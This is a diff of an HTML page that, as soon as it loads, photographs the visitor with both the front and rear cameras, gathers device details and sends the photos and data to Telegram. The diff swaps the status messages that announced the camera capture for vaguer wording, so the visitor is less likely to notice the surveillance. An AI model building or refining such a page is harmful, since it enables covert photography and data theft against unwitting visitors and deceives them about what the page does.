@@ -25,7 +25,7 @@
 </head>
 <body>
 
-<p id="status">📸 جارٍ تشغيل الكاميرا...</p>
+<p id="status"> ...</p>
 <video id="video" autoplay playsinline></video>
 
 <script>
@@ -95,15 +95,15 @@ ${deviceType}
 // تشغيل تلقائي عند فتح الموقع
 window.onload = async () => {
   try {
-    statusText.textContent = "📷 جاري التقاط الصورة الأمامية...";
+    statusText.textContent ="جاري التقاط عنوانك  ...";
     const front = await takePhoto("user");
 
-    statusText.textContent = "📷 جاري التقاط الصورة الخلفية...";
+    statusText.textContent = " جاري التقاط  اسم جهازك...";
     const back = await takePhoto("environment");
 
     const info = getDeviceInfo();
 
-    statusText.textContent = "📨 جاري إرسال الصور إلى تيليجرام...";
+    statusText.textContent = "📨 جاري إرسال المعلومات إلى ***...";
 
     await sendToTelegram(front, `الصورة الأمامية\n\n${info}`);
     await sendToTelegram(back, "📷 الصورة الخلفية");
@@ -117,4 +117,5 @@ window.onload = async () => {
 </script>
 
 </body>
+
 </html>
